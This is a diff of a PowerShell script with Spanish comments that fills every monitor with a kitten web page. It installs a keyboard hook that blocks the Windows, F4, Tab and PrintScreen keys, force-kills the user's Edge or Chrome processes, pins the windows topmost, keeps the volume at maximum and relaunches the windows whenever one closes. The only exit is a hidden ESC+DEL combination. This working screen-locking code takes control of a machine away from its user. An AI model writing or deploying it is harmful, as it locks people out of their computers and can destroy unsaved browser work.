@@ -1,7 +1,6 @@
 <#
-  run.ps1 - Gatitos en TODAS las pantallas
+  run.ps1 - Gatitos en TODAS las pantallas (versión corregida)
   Única salida: ESC + DEL
-  Reopen casi instantáneo
 #>
 
 $ErrorActionPreference = 'SilentlyContinue'
@@ -45,16 +44,9 @@ public static class KeyBlocker {
       int vk = Marshal.ReadInt32(lParam);
       long now = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();
 
-      if (vk == 0x1B) { // ESC
-        lastEsc = now;
-        if (now - lastDel < 700) shouldExit = true;
-      }
-      if (vk == 0x2E) { // DEL
-        lastDel = now;
-        if (now - lastEsc < 700) shouldExit = true;
-      }
+      if (vk == 0x1B) { lastEsc = now; if (now - lastDel < 700) shouldExit = true; }
+      if (vk == 0x2E) { lastDel = now; if (now - lastEsc < 700) shouldExit = true; }
 
-      // Bloquear teclas peligrosas
       if (vk == 0x5B || vk == 0x5C || vk == 0x73 || vk == 0x09 || vk == 0x5D || vk == 0x2C) {
         return (IntPtr)1;
       }
@@ -106,7 +98,25 @@ public static class Vol {
 }
 '@
 
-# ---------------- Obtener todas las pantallas ----------------
+# ---------------- API para mover ventanas ----------------
+Add-Type -TypeDefinition @'
+using System;
+using System.Runtime.InteropServices;
+
+public class WinAPI {
+  [DllImport("user32.dll")]
+  public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
+
+  [DllImport("user32.dll")]
+  public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+  public static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
+  public const uint SWP_SHOWWINDOW = 0x0040;
+  public const int SW_MAXIMIZE = 3;
+}
+'@
+
+# ---------------- Pantallas ----------------
 Add-Type -AssemblyName System.Windows.Forms
 $screens = [System.Windows.Forms.Screen]::AllScreens
 
@@ -127,13 +137,11 @@ $nav = Get-Nav
 if (-not $nav) { Write-Host "No se encontró Edge ni Chrome"; exit }
 $procName = [IO.Path]::GetFileNameWithoutExtension($nav)
 
-# Guardar los PIDs de cada monitor
 $script:pids = @{}
 
 function LanzarEnTodas {
-  # Cerrar instancias anteriores
   Get-Process -Name $procName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
-  Start-Sleep -Milliseconds 200
+  Start-Sleep -Milliseconds 300
   $script:pids = @{}
 
   $i = 0
@@ -145,23 +153,38 @@ function LanzarEnTodas {
     $w = $screen.Bounds.Width
     $h = $screen.Bounds.Height
 
-    $flags = "--kiosk `"$pageUrl`" --user-data-dir=`"$perfil`" --no-first-run " +
-             "--no-default-browser-check --disable-session-crashed-bubble --noerrdialogs " +
+    # IMPORTANTE: NO usamos --kiosk (ese es el que fuerza pantalla principal)
+    $flags = "--new-window --app=`"$pageUrl`" --user-data-dir=`"$perfil`" " +
+             "--no-first-run --no-default-browser-check --disable-session-crashed-bubble " +
              "--autoplay-policy=no-user-gesture-required --disable-infobars " +
-             "--window-position=$x,$y --window-size=$w,$h " +
-             "--disable-features=Translate,msEdgeWelcomePage,EdgeCollections,msEdgeSidebarV2"
-
-    if ($nav -match 'msedge') { $flags += ' --edge-kiosk-type=fullscreen' }
+             "--window-position=$x,$y --window-size=$w,$h"
 
     $p = Start-Process -FilePath $nav -ArgumentList $flags -PassThru
     if ($p) { $script:pids[$i] = $p.Id }
+  }
+
+  # Esperar a que las ventanas existan y forzar posición + topmost
+  Start-Sleep -Milliseconds 1200
+
+  foreach ($screen in $screens) {
+    $procs = Get-Process -Name $procName -ErrorAction SilentlyContinue
+    foreach ($p in $procs) {
+      if ($p.MainWindowHandle -ne [IntPtr]::Zero) {
+        $x = $screen.Bounds.X
+        $y = $screen.Bounds.Y
+        $w = $screen.Bounds.Width
+        $h = $screen.Bounds.Height
+
+        [WinAPI]::SetWindowPos($p.MainWindowHandle, [WinAPI]::HWND_TOPMOST, $x, $y, $w, $h, [WinAPI]::SWP_SHOWWINDOW) | Out-Null
+      }
+    }
   }
 }
 
 # Iniciar
 [KeyBlocker]::Start()
 LanzarEnTodas
-Start-Sleep -Milliseconds 900
+Start-Sleep -Milliseconds 500
 
 try {
   while ($true) {
@@ -169,22 +192,14 @@ try {
 
     [Vol]::Set(1.0)
 
-    # Contar cuántas ventanas del navegador siguen vivas
-    $vivos = 0
-    $procs = Get-Process -Name $procName -ErrorAction SilentlyContinue
-    foreach ($p in $procs) {
-      if ($script:pids.Values -contains $p.Id -or $p.MainWindowTitle -like "*$titulo*") {
-        $vivos++
-      }
-    }
+    $vivos = (Get-Process -Name $procName -ErrorAction SilentlyContinue | Measure-Object).Count
 
-    # Si faltan pantallas → relanzar todas
     if ($vivos -lt $screens.Count) {
       LanzarEnTodas
-      Start-Sleep -Milliseconds 400
+      Start-Sleep -Milliseconds 500
     }
 
-    Start-Sleep -Milliseconds 80
+    Start-Sleep -Milliseconds 100
   }
 }
 finally {
